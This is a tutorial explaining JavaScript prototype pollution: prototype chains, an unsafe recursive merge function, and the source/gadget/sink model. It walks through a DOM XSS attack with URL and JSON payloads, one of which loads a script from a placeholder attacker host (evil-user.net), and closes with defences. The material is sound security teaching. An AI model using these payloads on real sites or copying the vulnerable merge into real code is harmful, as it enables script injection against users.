# Part 1: JavaScript basics you need first

## 1.1 Objects are bags of key/value pairs

An object is a collection of **properties** (a key and a value).

```js
const user = {
  username: "wiener",
  isAdmin: false
};

user.username;      // "wiener"   (dot notation)
user["isAdmin"];    // false      (bracket notation)
```

If a property holds a function, it's called a **method**:

```js
const user = {
  username: "wiener",
  sayHi: function () { return "hi " + this.username; }
};
```

Almost everything in JavaScript (strings, arrays, numbers, functions) is an object under the hood.

## 1.2 Every object has a prototype

Every object is secretly linked to another object called its **prototype**. When you create something, JavaScript attaches a built-in prototype automatically:

```js
Object.getPrototypeOf({});     // Object.prototype
Object.getPrototypeOf("hi");   // String.prototype
Object.getPrototypeOf([]);     // Array.prototype
Object.getPrototypeOf(42);     // Number.prototype
```

The prototype is a shared "toolbox". That's why every string can do `.toLowerCase()` without you defining it:

```js
"HELLO".toLowerCase();   // "hello"  -> method lives on String.prototype
```

## 1.3 Inheritance: the lookup rule

When you read `obj.something`, JavaScript does this:

1. Look for `something` **on the object itself**.
2. Not there? Look on **its prototype**.
3. Not there? Look on the prototype's prototype... and so on.

```js
const empty = {};
empty.toString();   // works! "toString" isn't on `empty`,
                    // it's inherited from Object.prototype
```

An object's **own** property always wins over an inherited one with the same name.

You can use your browser console to see this behavior in action. First, create a completely empty object:
```
let myObject = {};
```
Next, type `myObject` followed by a dot. Notice that the console prompts you to select from a list of properties and methods:

<img width="780" height="514" alt="image" src="https://github.com/user-attachments/assets/20c2b076-d7e1-4744-83e6-86a27a65b7b1" />

Even though there are no properties or methods defined for the object itself, it has inherited some from the built-in `Object.prototype`.

## 1.4 The prototype chain

Because a prototype is itself an object, it has its own prototype. This forms a chain that ends at `Object.prototype`, whose prototype is `null`.

```
"hello"  -->  String.prototype  -->  Object.prototype  -->  null
```

So a string inherits from **both** `String.prototype` and `Object.prototype`.

<img width="797" height="520" alt="image" src="https://github.com/user-attachments/assets/facb135d-7e09-4a28-aa99-5f4d0630493b" />

## 1.5 `__proto__`: the doorway to the prototype

Every object exposes a special property, `__proto__`, that lets you **read or replace** its prototype. You can chain it to walk up:

```js
const s = "hello";

s.__proto__;                    // String.prototype
s.__proto__.__proto__;          // Object.prototype
s.__proto__.__proto__.__proto__; // null
```

> Remember this one. `__proto__` is the key (literally) that makes the whole attack possible.

## 1.6 Prototypes can be modified

Built-in prototypes are normal objects, so you *can* change them (usually a bad idea). Everything inheriting from them is instantly affected:

```js
String.prototype.shout = function () {
  return this.toUpperCase() + "!";
};

"hello".shout();   // "HELLO!"  <- every string now has this method
```

**Keep this in mind:** changing a prototype changes *every* object that inherits from it. Prototype pollution is an attacker doing this on purpose.

# Part 2: What is prototype pollution?

**Prototype pollution** is a vulnerability where an attacker can add or change properties on a global prototype (most often `Object.prototype`). Since almost every object inherits from it, the injected properties then "appear" on objects throughout the whole application.

```js
// Imagine an attacker somehow runs this:
Object.prototype.isAdmin = true;

// Now look at a totally unrelated object:
const normalUser = { username: "carlos" };
normalUser.isAdmin;   // true  <- inherited, never set by the developer!
```

On its own this may be harmless. It becomes dangerous when the app later **uses** one of those poisoned properties in an unsafe way:

| Where | Typical result |
|---|---|
| Client-side (browser) | DOM XSS |
| Server-side (Node.js) | Privilege escalation, or even remote code execution |

## How does it happen? The unsafe merge

The classic cause is a function that **recursively merges** user-controlled data into an existing object **without checking the keys**.

A simplified vulnerable function:

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);   // go deeper
    } else {
      target[key] = source[key];         // copy the value
    }
  }
  return target;
}
```

Now feed it attacker-controlled input containing the key `__proto__`:

```js
const settings = { theme: "dark" };
const userInput = JSON.parse('{"__proto__": {"polluted": "yes"}}');

merge(settings, userInput);

// What really happened inside merge():
//   target["__proto__"]  -> this is NOT a normal key, it returns Object.prototype
//   so   target.__proto__.polluted = "yes"   ->   Object.prototype.polluted = "yes"

({}).polluted;   // "yes"   <- every object is now polluted
```

The developer thought they were merging data into `settings`. Instead, because `__proto__` is "special", the data landed on the shared prototype.

# Part 3: The three ingredients: source, sink, gadget

A working exploit needs all three:

```
  SOURCE            GADGET              SINK
 (how you     ->  (a property the   ->  (dangerous function
  pollute)         app trusts)           that runs it)
```

## 3.1 Source: how you inject the properties

A **source** is any user-controllable input that lets you write to a prototype. The most common ones are:

- The **URL** (query string or `#fragment`)
- **JSON** input
- **Web messages** (`postMessage`)

### Source A: the URL

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

A query-string parser might turn this into a nested object. You'd expect this:

```js
{ existingProperty: "foo", __proto__: { evilProperty: "payload" } }
```

But when the app merges it, the engine effectively runs:

```js
targetObject.__proto__.evilProperty = "payload";
```

`__proto__` here is treated as a **getter for the prototype**, so `evilProperty` is written onto `Object.prototype`, not onto `targetObject`.

Other URL styles you may see in the wild (they depend on how the app parses the query):

```
?__proto__[evilProperty]=payload          # bracket style
?__proto__.evilProperty=payload           # dot style
#__proto__[evilProperty]=payload          # fragment version
```

### Source B: JSON input

`JSON.parse()` treats `__proto__` as just a plain string key, so it survives parsing as an **own property**:

```js
const literal  = { __proto__: { x: 1 } };
const fromJson = JSON.parse('{"__proto__": {"x": 1}}');

literal.hasOwnProperty("__proto__");    // false  (literal syntax sets the prototype)
fromJson.hasOwnProperty("__proto__");   // true   (it's now a normal key!)
```

That "normal key" is exactly what a naive `merge()` loop will iterate over and walk into, causing pollution. A malicious request body could look like:

```json
{
  "__proto__": {
    "evilProperty": "payload"
  }
}
```

## 3.2 Sink: where the damage happens

A **sink** is a function or DOM feature that can run attacker-influenced code or commands. Examples:

```js
eval(something)
element.innerHTML = something
script.src = something
child_process.execSync(something)   // server-side
```

Prototype pollution matters here because it lets you reach sinks through properties developers assumed were safe. They thought "no user can control `config.url`", so they didn't sanitize it.

## 3.3 Gadget: the property that connects pollution to the sink

A **gadget** is a property that:

1. The app **uses unsafely** (e.g. passes straight into a sink), **and**
2. Can be **inherited** from the prototype (so it's *not* defined on the object itself).

> If the object defines the property itself, its own value wins and you can't override it by polluting the prototype. A property only works as a gadget when it is missing from the object.

### Example gadget

Many libraries accept a `config` object and fall back to defaults when an option is missing:

```js
// Library code
let transport_url = config.transport_url || defaults.transport_url;

let script = document.createElement("script");
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

If the site's developers never set `config.transport_url`, then `config.transport_url` is looked up through the prototype chain. If an attacker has polluted `Object.prototype.transport_url`, the library happily loads the attacker's script.

# Part 4: A full attack walkthrough

Putting source + gadget + sink together against the library above.

**Step 1: Pollute via the URL source**, pointing the gadget at the attacker's server:

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

The page then loads:

```
//evil-user.net/example.js
```

**Step 2: Skip the external server by using a `data:` URL** so the payload is inside the link itself:

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

Why the trailing `//`? The library always appends `/example.js`. Ending the payload with `//` turns that suffix into a JavaScript comment, so it doesn't break the code:

```js
// resulting script src, effectively:
data:,alert(1);///example.js
//              ^^^^^^^^^^^ treated as a comment
```

**Step 3: Deliver.** The attacker just needs a victim to open the crafted link. Their browser pollutes `Object.prototype`, the library reads the poisoned `transport_url`, and `alert(1)` (or something worse) runs. That's DOM XSS.

## Test it yourself safely in the browser console

Paste this into any browser dev-tools console (it only affects that one tab):

```js
// 1. Check a clean object
const a = {};
console.log(a.hacked);                 // undefined

// 2. Pollute the global prototype
Object.prototype.hacked = "pwned";

// 3. A brand-new unrelated object inherits it
const b = { name: "test" };
console.log(b.hacked);                 // "pwned"

// 4. Note it is NOT an own property, only inherited
console.log(b.hasOwnProperty("hacked")); // false

// 5. Clean up
delete Object.prototype.hacked;
```

# Quick cheat sheet

| Term | Meaning (one line) |
|---|---|
| **Prototype** | The object another object inherits properties from |
| **Prototype chain** | Prototype -> its prototype -> ... -> `Object.prototype` -> `null` |
| **`__proto__`** | Special property that gets/sets an object's prototype |
| **Prototype pollution** | Injecting properties into a shared prototype so all objects inherit them |
| **Source** | The input you control (URL, JSON, web message) that does the polluting |
| **Sink** | A dangerous function/DOM feature (`eval`, `innerHTML`, `script.src`, ...) |
| **Gadget** | An inheritable property the app feeds into a sink |

**Root cause in one sentence:** merging untrusted objects into existing ones without filtering keys like `__proto__`.

## Common defensive ideas (general knowledge)

```js
// 1. Block dangerous keys when merging
const BLOCKED = ["__proto__", "constructor", "prototype"];
for (const key in source) {
  if (BLOCKED.includes(key)) continue;
  // ...safe to merge
}

// 2. Use objects with no prototype for lookup data
const safe = Object.create(null);   // inherits nothing

// 3. Freeze the global prototype
Object.freeze(Object.prototype);

// 4. Use a Map instead of a plain object for user-keyed data
const m = new Map();
```
